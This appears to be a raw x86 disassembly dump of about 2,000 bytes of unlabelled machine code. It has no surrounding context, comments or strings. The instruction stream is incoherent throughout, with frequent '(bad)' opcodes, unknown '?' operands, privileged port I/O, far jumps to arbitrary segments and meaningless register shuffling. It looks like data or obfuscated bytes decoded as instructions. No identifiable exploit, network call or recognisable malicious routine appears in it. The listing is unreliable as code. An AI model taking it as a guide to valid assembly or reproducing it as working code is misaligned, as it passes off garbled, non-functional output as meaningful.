  4041dc:	call   0x413468ea
  4041e1:	dec    edi
  4041e2:	xchg   DWORD PTR ds:0x13e41a4e,eax
  4041e8:	dec    edx
  4041e9:	push   esi
  4041ea:	sub    BYTE PTR [edx+0x3bbe78c],al
  4041f0:	repz jnp 0x4041c9
  4041f3:	xor    esi,DWORD PTR [edx+0xf]
  4041f6:	loop   0x4041f9
  4041f8:	cld    
  4041f9:	shl    BYTE PTR [esi+0x21],0x8f
  4041fd:	xchg   edx,eax
  4041fe:	xor    al,BYTE PTR [ebp-0x613b7a95]
  404204:	arpl   WORD PTR [eax],bx
  404206:	mov    esp,0xecd67618
  40420b:	stos   DWORD PTR es:[edi],eax
  40420c:	mov    dh,0x5c
  40420e:	mov    ds:0xe0ebc808,eax
  404213:	push   0x7aa9c97
  404218:	(bad)  
  404219:	stc    
  40421a:	out    0xc3,eax
  40421c:	cmp    esp,DWORD PTR [esi]
  40421e:	in     eax,dx
  40421f:	lea    esp,[eax-0x7f6662ec]
  404225:	xchg   BYTE PTR [esi+0x3d],ch
  404228:	shl    DWORD PTR [edi+edx*1+0x40],cl
  40422c:	sbb    edi,edx
  40422e:	retf   0xef99
  404231:	es retf 0xd345
  404235:	or     al,0x42
  404237:	mov    cl,BYTE PTR cs:[ebx+0x7d]
  40423b:	(bad)  
  40423c:	mov    edi,DWORD PTR [eax-0x41]
  40423f:	sub    DWORD PTR [esi-0x25],ebp
  404242:	pop    edx
  404243:	sub    DWORD PTR [esi],0x3aabed49
  404249:	or     al,0x39
  40424b:	mov    ecx,0x2ec88f0e
  404250:	push   cs
  404251:	add    eax,edi
  404253:	sub    DWORD PTR [edi-0x2c],ebx
  404256:	cmp    eax,0x2ad71cce
  40425b:	push   0xffffff88
  40425d:	mov    ebp,0x2c09c934
  404262:	jge    0x4042cd
  404264:	mov    ecx,DWORD PTR [edi+ebp*2]
  404267:	sti    
  404268:	dec    esp
  404269:	pop    es
  40426a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40426b:	or     eax,0x7eebe2a4
  404270:	adc    ch,ah
  404272:	dec    ebx
  404273:	add    esp,edx
  404275:	into   
  404276:	inc    ebp
  404277:	mov    WORD PTR [esi+0x6bcf4eeb],?
  40427d:	fistp  DWORD PTR [edi]
  40427f:	jmp    0x4042cd
  404281:	cld    
  404282:	cmp    eax,DWORD PTR [edi+0x18f93757]
  404288:	sub    al,0x34
  40428a:	lods   al,BYTE PTR ds:[esi]
  40428b:	xchg   edi,eax
  40428c:	neg    cl
  40428e:	cwde   
  40428f:	dec    eax
  404290:	or     edx,DWORD PTR [ecx+0x64]
  404293:	repz mov ds:0x3bb7459f,eax
  404299:	mov    ch,0xa6
  40429b:	pusha  
  40429c:	push   cs
  40429d:	mov    ebx,0x6c6a3e7e
  4042a2:	mov    eax,0x3803321f
  4042a7:	loop   0x4042b9
  4042a9:	std    
  4042aa:	sbb    eax,0xeb6803a
  4042af:	push   ecx
  4042b0:	add    DWORD PTR [ecx-0x3d],0x45
  4042b4:	xchg   edx,eax
  4042b5:	push   ebp
  4042b6:	xor    ch,ch
  4042b8:	fdiv   st,st(2)
  4042ba:	test   al,0x50
  4042bc:	shr    DWORD PTR [esi+0xf],cl
  4042bf:	lods   al,BYTE PTR ds:[esi]
  4042c0:	or     eax,0x9b135fba
  4042c5:	jbe    0x4042bc
  4042c7:	stos   DWORD PTR es:[edi],eax
  4042c8:	pop    ss
  4042c9:	jl     0x404290
  4042cb:	sub    DWORD PTR [ecx-0x4130f4a6],0x46
  4042d2:	adc    BYTE PTR [ebx-0x2e6970d6],ch
  4042d8:	xchg   esi,eax
  4042d9:	inc    eax
  4042da:	xchg   DWORD PTR [edi+0x43],edx
  4042dd:	shr    DWORD PTR [esi-0x56c2dff9],cl
  4042e3:	jle    0x404319
  4042e5:	in     al,0xb0
  4042e7:	or     DWORD PTR [esi+0x2517d2a6],edi
  4042ed:	fstp   DWORD PTR [edx]
  4042ef:	(bad)  
  4042f0:	xchg   esi,eax
  4042f1:	adc    bl,bl
  4042f3:	mov    fs,WORD PTR [edx-0x6949b16]
  4042f9:	push   edi
  4042fa:	mov    ah,0x39
  4042fc:	mov    ah,0xdb
  4042fe:	jns    0x404375
  404300:	and    al,0x2b
  404302:	cwde   
  404303:	lahf   
  404304:	test   al,0x6c
  404306:	inc    eax
  404307:	stos   BYTE PTR es:[edi],al
  404308:	imul   edi,ecx,0x85f4e467
  40430e:	shl    edi,0x71
  404311:	jno    0x4042c4
  404313:	xor    eax,0xa91bfefc
  404318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404319:	mov    edx,DWORD PTR [esi+0x14]
  40431c:	loop   0x4042d0
  40431e:	dec    esp
  40431f:	mov    ds:0xf09a0fae,eax
  404324:	pop    esp
  404325:	inc    ecx
  404326:	loope  0x4042dd
  404328:	pusha  
  404329:	retf   0x7546
  40432c:	mov    dh,0x77
  40432e:	imul   esp,DWORD PTR [eax*4-0x39083b20],0x39
  404336:	scas   eax,DWORD PTR es:[edi]
  404337:	rol    BYTE PTR [ebx+0x975e56a],cl
  40433d:	pop    fs
  40433f:	add    bh,BYTE PTR [ebx]
  404341:	mov    al,0x1b
  404343:	push   ebp
  404344:	mov    ah,0xfe
  404346:	(bad)  
  404347:	adc    BYTE PTR [eax+0x5],ah
  40434a:	mov    ebx,DWORD PTR [esi+eax*1+0x4989be5b]
  404351:	mov    bl,cl
  404353:	(bad)  
  404354:	jbe    0x404360
  404356:	lds    eax,FWORD PTR [edx-0x69]
  404359:	lsl    ecx,WORD PTR ds:0x672c012e
  404360:	jg     0x404343
  404362:	push   cs
  404363:	pop    ecx
  404364:	push   cs
  404365:	push   eax
  404366:	inc    esp
  404367:	mov    eax,0x1d854f39
  40436c:	pop    ebp
  40436d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40436e:	repnz mov dl,0xf
  404371:	push   cs
  404372:	stos   DWORD PTR es:[edi],eax
  404373:	aam    0x9b
  404375:	adc    al,0xba
  404377:	and    BYTE PTR [edx-0x61],ch
  40437a:	hlt    
  40437b:	dec    DWORD PTR ds:0x5b8be2a0
  404381:	(bad)  
  404382:	xor    edx,DWORD PTR [esi+0x5d045e0]
  404388:	inc    eax
  404389:	sub    BYTE PTR [ebp-0x657d5c31],bl
  40438f:	xchg   edi,esi
  404391:	loope  0x404388
  404393:	and    eax,0x1d032c90
  404398:	cmc    
  404399:	shl    bl,cl
  40439b:	xor    bl,cl
  40439d:	mov    bh,0xda
  40439f:	cmp    al,0x58
  4043a1:	jmp    0x36cf:0x963024ce
  4043a8:	gs out 0xc6,eax
  4043ab:	inc    ebx
  4043ac:	fnstsw WORD PTR [ebx-0x7ebb66ab]
  4043b2:	pop    edx
  4043b3:	icebp  
  4043b4:	fcom   st(6)
  4043b6:	push   ds
  4043b7:	icebp  
  4043b8:	push   esi
  4043b9:	adc    al,0x20
  4043bb:	dec    eax
  4043bc:	sub    al,0x32
  4043be:	out    dx,eax
  4043bf:	es mov al,0x85
  4043c2:	pop    eax
  4043c3:	jl     0x40434a
  4043c5:	test   eax,0x6580e6f6
  4043ca:	pushf  
  4043cb:	fs adc bl,bl
  4043ce:	xor    edx,DWORD PTR [ecx]
  4043d0:	xchg   ebp,eax
  4043d1:	es lahf 
  4043d3:	sar    ecx,cl
  4043d5:	mov    edx,0x1429eaa0
  4043da:	pop    ds
  4043db:	pushf  
  4043dc:	cmp    eax,0xe7a435cf
  4043e1:	out    0x1f,eax
  4043e3:	ins    BYTE PTR es:[edi],dx
  4043e4:	sub    edx,DWORD PTR [ebx+0x2b172230]
  4043ea:	sub    BYTE PTR [edi-0x13216de1],ch
  4043f0:	xchg   ecx,eax
  4043f1:	rol    BYTE PTR [ebx-0x14718d66],0xd8
  4043f8:	aad    0x57
  4043fa:	test   eax,0x6456962d
  4043ff:	add    edx,0x7cfe5c24
  404405:	sbb    eax,0xd10d3e7e
  40440a:	cmp    DWORD PTR [edi],0x1a
  40440d:	sahf   
  40440e:	daa    
  40440f:	enter  0xd14c,0x77
  404413:	add    eax,0x608e336
  404418:	mov    eax,ds:0xbc8fb4dc
  40441d:	icebp  
  40441e:	je     0x404498
  404420:	outs   dx,DWORD PTR ds:[esi]
  404421:	and    bh,BYTE PTR [edi+0x5]
  404424:	xor    cl,BYTE PTR [ebp-0x29]
  404427:	cmp    BYTE PTR [esi+esi*1-0x2c],ah
  40442b:	out    dx,al
  40442c:	fstp   DWORD PTR [ebp-0x39]
  40442f:	imul   eax,DWORD PTR [esi-0x6469eacb],0xcc98266f
  404439:	mov    eax,0xef864dc8
  40443e:	xor    eax,0xd343906e
  404443:	lods   eax,DWORD PTR ds:[esi]
  404444:	mov    ecx,0xed9298d4
  404449:	add    al,BYTE PTR [esi]
  40444b:	cwde   
  40444c:	jg     0x4044bc
  40444e:	popf   
  40444f:	xchg   ch,dh
  404451:	mov    bh,0xd0
  404453:	nop
  404454:	inc    ebp
  404455:	call   0xcbf6eda7
  40445a:	(bad)
  40445e:	imul   edi,DWORD PTR [eax],0xffffffe4
  404461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404462:	outs   dx,DWORD PTR ds:[esi]
  404463:	nop
  404464:	lahf   
  404465:	mov    dl,ah
  404467:	ss in  eax,0x37
  40446a:	dec    ecx
  40446b:	dec    eax
  40446c:	or     DWORD PTR [edi-0x1b],ebp
  40446f:	xor    al,0xf8
  404471:	push   0x67
  404473:	das    
  404474:	mov    ebp,0x1cdb2fdb
  404479:	(bad)  
  40447a:	mov    ?,ebp
  40447c:	xor    BYTE PTR [ecx+ebp*4-0x36],0xd1
  404481:	pop    eax
  404482:	popa   
  404483:	fs push edx
  404485:	addr16 mov ecx,0x4a3f6dce
  40448b:	stc    
  40448c:	jne    0x4044cd
  40448e:	cmp    BYTE PTR [ebp-0x3d4cf313],0xd6
  404495:	out    dx,al
  404496:	and    edx,DWORD PTR [ecx-0x65]
  404499:	add    bh,BYTE PTR [edx+0x64e22c58]
  40449f:	fwait
  4044a0:	daa    
  4044a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044a2:	sbb    ebp,esi
  4044a4:	imul   esp,ebp,0xffffffb4
  4044a7:	addr16 inc edx
  4044a9:	in     al,dx
  4044aa:	sbb    eax,0x413892c3
  4044af:	pop    eax
  4044b0:	mov    ss,WORD PTR [ecx+ecx*4+0x24]
  4044b4:	cli    
  4044b5:	push   ds
  4044b6:	inc    ecx
  4044b7:	lods   eax,DWORD PTR ds:[esi]
  4044b8:	mov    ebp,0x8f79a6c5
  4044bd:	lea    ebx,[edx]
  4044bf:	mov    cl,0x17
  4044c1:	push   ds
  4044c2:	or     al,0x9f
  4044c4:	mov    ebp,0x65fd72fb
  4044c9:	cmp    BYTE PTR [ebx-0x17],bh
  4044cc:	xchg   edx,eax
  4044cd:	push   edx
  4044ce:	dec    eax
  4044cf:	clc    
  4044d0:	jo     0x4044a9
  4044d2:	cmp    ebp,edx
  4044d4:	scas   al,BYTE PTR es:[edi]
  4044d5:	shl    DWORD PTR [eax+ecx*8+0x3edc300b],1
  4044dc:	jge    0x4044ab
  4044de:	xchg   ebx,eax
  4044df:	jmp    0xc5e2:0x48e3040b
  4044e6:	push   ecx
  4044e7:	or     DWORD PTR [ebx+eax*2+0x4c],edi
  4044eb:	es sub al,0xfe
  4044ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044ef:	imul   ebx,DWORD PTR [esi-0x1d8caf64],0xbf448e19
  4044f9:	lock cli 
  4044fb:	jns    0x404562
  4044fd:	stos   BYTE PTR es:[edi],al
  4044fe:	cdq    
  4044ff:	popf   
  404500:	mov    edi,0x200f677a
  404505:	out    dx,eax
  404506:	test   DWORD PTR [edx],ebx
  404508:	or     DWORD PTR [eax],esi
  40450a:	and    eax,0x65b1685
  40450f:	mov    bl,0x50
  404511:	icebp  
  404512:	mov    ah,0x38
  404514:	addr16 jle 0x4044e3
  404517:	xor    esp,eax
  404519:	push   ds
  40451a:	dec    ecx
  40451b:	xchg   ebx,eax
  40451c:	in     eax,dx
  40451d:	hlt    
  40451e:	or     DWORD PTR [edx-0x79907ea2],esp
  404524:	sub    al,0x23
  404526:	sti    
  404527:	jnp    0x4044d1
  404529:	adc    edx,DWORD PTR ds:[ebx+0x6dc2d93f]
  404530:	call   0x1743e1b5
  404535:	pop    ecx
  404536:	mov    ch,0x7a
  404538:	sbb    ecx,DWORD PTR [ebx+ebp*8-0x1c]
  40453c:	xchg   BYTE PTR [ebx+0x77589ce1],bh
  404542:	jle    0x404547
  404544:	and    DWORD PTR [eax-0x34c3903],edi
  40454a:	ror    DWORD PTR [ebx],0xb9
  40454d:	add    eax,0xa2534eb6
  404552:	lea    eax,[edx-0x24]
  404555:	adc    BYTE PTR [edx-0x56c1a280],0xee
  40455c:	shl    BYTE PTR [esi],cl
  40455e:	fistp  WORD PTR [ebx+0x265b8ccb]
  404564:	mov    eax,0xd2de2066
  404569:	push   ds
  40456a:	pop    esp
  40456b:	clc    
  40456c:	ss push eax
  40456e:	(bad)  
  404570:	jbe    0x4045ae
  404572:	jle    0x40454c
  404574:	std    
  404575:	inc    esi
  404576:	mov    dl,0x4d
  404578:	fwait
  404579:	call   DWORD PTR [ecx]
  40457b:	lods   al,BYTE PTR ds:[esi]
  40457c:	fs loop 0x40450b
  40457f:	dec    esp
  404580:	ror    BYTE PTR [edi+0x282686b8],1
  404586:	out    0x3c,eax
  404588:	popf   
  404589:	adc    eax,0x5f4250fa
  40458e:	or     esi,DWORD PTR [edi-0x77]
  404591:	loope  0x40454f
  404593:	retf   
  404594:	inc    ebp
  404595:	and    al,0x74
  404597:	cmc    
  404598:	test   eax,0xbdfd2bb9
  40459d:	shl    DWORD PTR [ebx-0x2672bf52],1
  4045a3:	mov    ecx,DWORD PTR [eax]
  4045a5:	or     ebp,DWORD PTR [ebx+ecx*8-0x2fd9d362]
  4045ac:	xchg   esi,eax
  4045ad:	dec    eax
  4045ae:	addr16 cdq 
  4045b0:	daa    
  4045b1:	loope  0x4045ef
  4045b3:	mov    ss:0x3bada510,eax
  4045b9:	enter  0x7a3f,0xa7
  4045bd:	mov    cl,0xad
  4045bf:	jnp    0x40459f
  4045c1:	add    al,0xcf
  4045c3:	jge    0x40463f
  4045c5:	sbb    BYTE PTR [edi-0x53],0x49
  4045c9:	mov    esp,0x3965d115
  4045ce:	mov    eax,0x274f2d89
  4045d3:	mov    esi,0xbd765b13
  4045d8:	(bad)  
  4045d9:	arpl   WORD PTR [eax+0x65],si
  4045dc:	scas   eax,DWORD PTR es:[edi]
  4045dd:	push   esp
  4045de:	or     BYTE PTR [ebx],dl
  4045e0:	xchg   BYTE PTR [ecx-0x46],cl
  4045e3:	dec    eax
  4045e4:	mov    esi,0x26309a01
  4045e9:	mov    ah,BYTE PTR [edi]
  4045eb:	xchg   edx,eax
  4045ec:	mov    esp,ebx
  4045ee:	je     0x4045af
  4045f0:	jmp    0x1e4be23b
  4045f5:	pop    edx
  4045f6:	pop    esi
  4045f7:	add    al,0x26
  4045f9:	(bad)  
  4045fa:	xor    eax,0xe32a87c2
  4045ff:	and    edx,DWORD PTR [edx]
  404601:	mov    bl,0x65
  404603:	jnp    0x404631
  404605:	add    esi,0x53196161
  40460b:	push   cs
  40460c:	jmp    0x7e28:0x2533cb8d
  404613:	out    0x63,eax
  404615:	int    0x98
  404617:	cs jge 0x4045d5
  40461a:	das    
  40461b:	jns    0x4045a5
  40461d:	mov    esp,0x9298797a
  404622:	push   ebx
  404623:	nop
  404624:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404625:	das    
  404626:	sti    
  404627:	pop    esi
  404628:	adc    DWORD PTR [ebx+ebx*4+0xe09130f],eax
  40462f:	cmp    eax,eax
  404631:	or     DWORD PTR [ebx+ebx*2+0x3116f40d],edx
  404638:	nop
  404639:	adc    eax,0x2360132e
  40463e:	xchg   ebp,eax
  40463f:	dec    esp
  404640:	sbb    ch,BYTE PTR ds:0x60c864c7
  404646:	add    al,0xc2
  404648:	aas    
  404649:	aad    0xbe
  40464b:	jns    0x404652
  40464d:	jne    0x4045e9
  40464f:	cli    
  404650:	test   cl,bl
  404652:	xor    eax,0x69e6461a
  404657:	push   ecx
  404658:	lahf   
  404659:	lods   eax,DWORD PTR ds:[esi]
  40465a:	das    
  40465b:	sbb    ah,0xa0
  40465e:	pop    esi
  40465f:	scas   eax,DWORD PTR es:[edi]
  404660:	leave  
  404661:	and    al,0xed
  404663:	in     al,dx
  404664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404665:	pushf  
  404666:	out    0xa7,al
  404668:	mov    al,0xc4
  40466a:	test   BYTE PTR [ebx],ah
  40466c:	pop    ebx
  40466d:	add    al,0xe2
  40466f:	das    
  404670:	jnp    0x40465a
  404672:	in     eax,dx
  404673:	loopne 0x4046aa
  404675:	loop   0x404642
  404677:	dec    ecx
  404678:	jp     0x4046e6
  40467a:	loop   0x4046df
  40467c:	sub    BYTE PTR [esi],cl
  40467e:	jnp    0x404696
  404680:	add    eax,0x44ac0183
  404685:	xor    eax,0xdcef6e34
  40468a:	inc    ecx
  40468b:	mov    ds:0x2766529b,al
  404690:	push   ebp
  404691:	retf   
  404692:	(bad)  
  404693:	bound  eax,QWORD PTR [ebp+0x17]
  404696:	ins    DWORD PTR es:[edi],dx
  404697:	packuswb mm0,QWORD PTR [edi+esi*8]
  40469b:	(bad)  
  40469c:	or     eax,0xee5b119d
  4046a1:	push   edi
  4046a2:	mov    al,ds:0x8ba7c999
  4046a7:	(bad)  
  4046a8:	es leave 
  4046aa:	data16 mov bh,0x37
  4046ad:	mov    edx,0x41c99c42
  4046b2:	out    dx,al
  4046b3:	stos   BYTE PTR es:[edi],al
  4046b4:	ja     0x4046de
  4046b6:	(bad)  
  4046b7:	cdq    
  4046b8:	push   cs
  4046b9:	stc    
  4046ba:	hlt    
  4046bb:	out    dx,al
  4046bc:	(bad)  
  4046bd:	pop    edi
  4046be:	out    0x56,eax
  4046c0:	arpl   bp,cx
  4046c2:	adc    dl,0x92
  4046c5:	inc    edx
  4046c6:	mov    al,ds:0x3a682933
  4046cb:	int    0x65
  4046cd:	push   0x22797bcf
  4046d2:	into   
  4046d3:	(bad)  
  4046d4:	dec    ebp
  4046d5:	pop    esi
  4046d6:	stos   BYTE PTR es:[edi],al
  4046d7:	pop    ds
  4046d8:	hlt    
  4046d9:	add    ecx,DWORD PTR [eax]
  4046db:	mov    al,0x12
  4046dd:	nop
  4046de:	push   edx
  4046df:	dec    esi
  4046e0:	adc    DWORD PTR ds:0xf968fd92,ebp
  4046e6:	add    eax,0x27630630
  4046eb:	(bad)  
  4046ec:	out    dx,al
  4046ed:	dec    ecx
  4046ee:	jb     0x4046d2
  4046f0:	mov    eax,0xa7f35006
  4046f5:	lock mov dl,0x11
  4046f8:	and    BYTE PTR [esi],bh
  4046fa:	mov    ?,ebp
  4046fc:	cwde   
  4046fd:	and    DWORD PTR [ebx+0x45c88a00],ebx
  404703:	nop
  404704:	out    0x7a,eax
  404706:	fucomi st,st(0)
  404708:	pop    edx
  404709:	(bad)  
  40470a:	and    eax,0x9dd8b545
  40470f:	push   ss
  404710:	push   eax
  404711:	push   esp
  404712:	ds inc esi
  404714:	int    0x86
  404716:	jl     0x40472e
  404718:	fsub   QWORD PTR [esi]
  40471a:	leave  
  40471b:	retf   0xe391
  40471e:	sar    edi,0x8a
  404721:	aam    0x2d
  404723:	(bad)  
  404724:	nop
  404725:	fistp  WORD PTR [eax]
  404727:	pop    ss
  404728:	ret    0x8f9c
  40472b:	jno    0x4046c5
  40472d:	jne    0x404713
  40472f:	sbb    BYTE PTR [eax-0x56],0x44
  404733:	add    ebx,DWORD PTR [eax+0x37]
  404736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404737:	mov    eax,ds:0xa9d3904d
  40473c:	in     eax,dx
  40473d:	repnz cmp BYTE PTR [esi-0x3e],ah
  404741:	mov    esp,0xc1bdf84a
  404746:	outs   dx,DWORD PTR ds:[esi]
  404747:	dec    edi
  404748:	cmp    al,BYTE PTR [esi+ebp*1]
  40474b:	sti    
  40474c:	mov    BYTE PTR [edi+0xc],ah
  40474f:	pop    ds
  404750:	outs   dx,DWORD PTR ds:[esi]
  404751:	mov    dl,0x38
  404753:	xor    esi,DWORD PTR [eax-0x11]
  404756:	int3   
  404757:	sbb    DWORD PTR [edx-0xef5dba6],eax
  40475d:	mov    ds:0xb3c54ab5,al
  404762:	dec    edi
  404763:	popa   
  404764:	pop    eax
  404765:	mov    ds:0x67dc1cc1,eax
  40476a:	pop    edx
  40476b:	push   ebp
  40476c:	repz pop ebp
  40476e:	jnp    0x404780
  404770:	idiv   BYTE PTR [edi]
  404772:	out    0xa,eax
  404774:	cmp    al,0xd6
  404776:	imul   ecx,DWORD PTR [edi+edi*4-0x2e],0x7d2e284
  40477e:	cdq    
  40477f:	nop
  404780:	mov    WORD PTR [ebx],ds
  404782:	and    BYTE PTR [edi],bl
  404784:	or     edx,DWORD PTR [eax+0x4a]
  404787:	hlt    
  404788:	cmp    eax,ecx
  40478a:	jp     0x4047cb
  40478c:	out    0x24,al
  40478e:	js     0x4047e6
  404790:	xor    dh,BYTE PTR [esi-0x39a25996]
  404796:	xchg   ecx,eax
  404797:	mov    eax,0xbefcbd95
  40479c:	mov    edx,0x869a13f4
  4047a1:	fcmovnu st,st(0)
  4047a3:	repnz fist WORD PTR [esi-0x5484c09f]
  4047aa:	neg    BYTE PTR [esi]
  4047ac:	add    BYTE PTR [esi+0x77],ah
  4047af:	pop    edx
  4047b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047b1:	xlat   BYTE PTR ds:[ebx]
  4047b2:	lods   al,BYTE PTR ds:[esi]
  4047b3:	fwait
  4047b4:	mov    ah,BYTE PTR [ecx-0x12]
  4047b7:	pop    edx
  4047b8:	scas   al,BYTE PTR es:[edi]
  4047b9:	mov    eax,ds:0xbfc1ebcf
  4047be:	loop   0x4047a8
  4047c0:	mov    ds:0x1619888a,eax
  4047c5:	into   
  4047c6:	test   DWORD PTR [eax+0x5b8634fd],edi
  4047cc:	scas   eax,DWORD PTR es:[edi]
  4047cd:	fdivr  st(0),st
  4047cf:	mov    ebp,0x638e07a5
  4047d4:	and    BYTE PTR [edi],bl
  4047d6:	stc    
  4047d7:	jno    0x404818
  4047d9:	xor    DWORD PTR [eax+0x1a],esp
  4047dc:	cmp    dh,BYTE PTR [ebx-0x459f028]
  4047e2:	js     0x404824
  4047e4:	sbb    bh,BYTE PTR [edx+0xaf2757b]
  4047ea:	aam    0x1f
  4047ec:	lock and DWORD PTR [eax+0x1d7fab77],edi
  4047f3:	pop    edi
  4047f4:	dec    eax
  4047f5:	adc    eax,DWORD PTR [ebx+0x35]
  4047f8:	dec    esi
  4047f9:	mov    edx,0x2454dcf7
  4047fe:	(bad)  
  4047ff:	int3   
  404800:	in     eax,0x55
  404802:	hlt    
  404803:	xchg   ch,bh
  404805:	xor    esp,DWORD PTR [ebp+0x5b287476]
  40480b:	daa    
  40480c:	adc    eax,0x4c8934d4
  404811:	mov    ecx,0xefe987da
  404816:	add    ch,BYTE PTR [esi]
  404818:	inc    eax
  404819:	cs in  eax,dx
  40481b:	dec    esi
  40481c:	push   esp
  40481d:	or     DWORD PTR [ebx-0x59],ebp
  404820:	adc    ah,BYTE PTR [ecx]
  404822:	xchg   DWORD PTR [eax+0x7],edi
  404825:	pop    edi
  404826:	push   ss
  404827:	ja     0x404820
  404829:	push   ecx
  40482a:	xor    dh,BYTE PTR gs:[ecx]
  40482d:	and    BYTE PTR [edx-0x40a8b69f],ah
  404833:	xor    ebx,esp
  404835:	scas   eax,DWORD PTR es:[edi]
  404836:	outs   dx,BYTE PTR ds:[esi]
  404837:	jmp    0xdbdf:0x3bc41d6
  40483e:	loopne 0x404891
  404840:	pop    eax
  404841:	fnsave [ebx+ebx*8-0x2726b9b4]
  404848:	jmp    0xe303b601
  40484d:	addr16 cs daa 
  404850:	mov    eax,0x95176ab9
  404855:	push   ds
  404856:	inc    ebx
  404857:	loop   0x404861
  404859:	push   es
  40485a:	enter  0xafb4,0xbc
  40485e:	jmp    0x512a4cdc
  404863:	(bad)  
  404864:	scas   al,BYTE PTR es:[edi]
  404865:	fwait
  404866:	int3   
  404867:	sbb    DWORD PTR [edx],ebx
  404869:	mov    edx,0x47c5cb99
  40486e:	cld    
  40486f:	adc    ebx,DWORD PTR [ebx]
  404871:	push   esi
  404872:	or     bh,BYTE PTR [esi+ebp*4-0x2b186497]
  404879:	int    0xc4
  40487b:	mov    edi,0x52989e76
  404880:	cmp    al,0xc9
  404882:	jle    0x40487d
  404884:	jle    0x4048ea
  404886:	nop
  404887:	outs   dx,DWORD PTR ds:[esi]
  404888:	dec    ecx
  404889:	dec    eax
  40488a:	add    ah,bh
  40488c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40488d:	cwde   
  40488e:	das    
  40488f:	pop    esp
  404890:	xchg   edi,eax
  404891:	mov    cs,WORD PTR ds:0x8961c1a2
  404897:	das    
  404898:	ja     0x40481e
  40489a:	outs   dx,BYTE PTR ds:[esi]
  40489b:	(bad)  
  40489c:	add    bh,BYTE PTR [esi]
  40489e:	mov    esp,0x9d6cb8e
  4048a3:	inc    edx
  4048a4:	enter  0xda62,0xf2
  4048a8:	add    dl,BYTE PTR [edx+eax*4]
  4048ab:	sbb    DWORD PTR fs:[edx],0xb
  4048af:	jmp    0xe4d38a02
  4048b4:	pushf  
  4048b5:	in     eax,dx
  4048b6:	test   al,0xfe
  4048b8:	inc    edx
  4048b9:	pop    es
  4048ba:	xchg   esi,eax
  4048bb:	jns    0x404893
  4048bd:	cs inc sp
  4048c0:	(bad)  
  4048c1:	adc    ebp,DWORD PTR [ebx]
  4048c3:	sbb    esi,edx
  4048c5:	inc    ecx
  4048c6:	push   ss
  4048c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048c8:	sub    eax,0x687cfdec
  4048cd:	dec    esi
  4048ce:	shr    dh,0x1f
  4048d1:	mov    al,ds:0xd1c23c48
  4048d6:	mov    al,0xba
  4048d8:	mov    esi,0x1af010e2
  4048dd:	or     eax,0xba5b9402
  4048e2:	iret   
  4048e3:	ins    DWORD PTR es:[edi],dx
  4048e4:	inc    esp
  4048e5:	fscale 
  4048e7:	pop    eax
  4048e8:	shr    DWORD PTR [eax],1
  4048ea:	xchg   BYTE PTR [ecx],ah
  4048ec:	adc    DWORD PTR [ebp+0xa1948d0],esi
  4048f2:	lods   al,BYTE PTR ds:[esi]
  4048f3:	mov    BYTE PTR [eax-0x6b],bh
  4048f6:	sti    
  4048f7:	mov    ecx,0x2dfbfd71
  4048fc:	xor    BYTE PTR [edi+0xf],dl
  4048ff:	add    al,0x29
  404901:	dec    ecx
  404902:	mov    dl,al
  404904:	pusha  
  404905:	shr    BYTE PTR [ebx+0x4b],1
  404908:	(bad)  
  404909:	sub    al,0x1d
  40490b:	popf   
  40490c:	ja     0x40489d
  40490e:	push   ss
  40490f:	adc    edx,esp
  404911:	xchg   DWORD PTR [edi-0x32],ebp
  404914:	push   eax
  404915:	inc    ecx
  404916:	ret    0x1c2
  404919:	sub    DWORD PTR [ebx-0x2a],ecx
  40491c:	sub    bh,bh
  40491e:	push   edx
  40491f:	push   ecx
  404920:	inc    esp
  404921:	mov    ds:0x43e2428b,al
  404926:	or     eax,0x13c15cf1
  40492b:	int3   
  40492c:	dec    bp
  40492e:	xor    BYTE PTR [ebx+0x36],cl
  404931:	or     ch,bh
  404933:	xchg   ebx,eax
  404934:	add    dh,BYTE PTR [edx+eiz*1+0x16]
  404938:	ins    BYTE PTR es:[edi],dx
  404939:	jo     0x4048c9
  40493b:	test   esi,0x1a173fdc
  404941:	ror    BYTE PTR [ebx-0x33876c74],0xd
  404948:	ret    0x7e21
  40494b:	aas    
  40494c:	push   edi
  40494d:	add    al,0x29
  40494f:	jb     0x4048f5
  404951:	fimul  DWORD PTR [ebx+0x39]
  404954:	loopne 0x404900
  404956:	out    dx,eax
  404957:	jmp    0x40491f
  404959:	cmc    
  40495a:	imul   ecx,DWORD PTR [ebp+0x7e],0x6c
  40495e:	stos   BYTE PTR es:[edi],al
  40495f:	jl     0x404916
  404961:	in     eax,dx
  404962:	cmp    al,0xf9
  404964:	rcr    DWORD PTR [ebx+0x5],0x27
  404968:	add    DWORD PTR [eax],ebp
  40496a:	mov    ds:0xadedcc89,al
  40496f:	cmp    BYTE PTR [ebx-0x3f05bbf5],cl
  404975:	outs   dx,BYTE PTR ds:[esi]
  404976:	mov    edi,0x88ce9dff
  40497b:	jne    0x404950
  40497d:	clc    
  40497e:	push   ebx
  40497f:	aaa    
  404980:	jns    0x4049a9
  404982:	js     0x4049eb
  404984:	aad    0xe4
  404986:	imul   ebx,DWORD PTR [ebx-0x5a457d14],0x46b95963
  404990:	and    al,0xf2
  404992:	frstor [eax]
  404994:	ficomp DWORD PTR ds:0xeb127dd2
  40499a:	out    dx,eax
  40499b:	jg     0x4049f9
  40499d:	inc    ebp
  40499e:	push   esp
  40499f:	sub    eax,0x1ff96b6e
  4049a4:	mov    dh,BYTE PTR [ebp+0x46fa8914]
  4049aa:	out    dx,al
  4049ab:	bound  esp,QWORD PTR [edi+0x42]
  4049ae:	jb     0x404930
  4049b0:	int3   
  4049b1:	scas   eax,DWORD PTR es:[edi]
  4049b2:	seta   cl
  4049b5:	sar    BYTE PTR [ebx],cl
  4049b7:	mov    dh,0xef
  4049b9:	pop    esp
  4049ba:	(bad)  
  4049bb:	lock sbb edi,DWORD PTR [edx-0x60]
  4049bf:	adc    BYTE PTR [ecx-0x6],bl
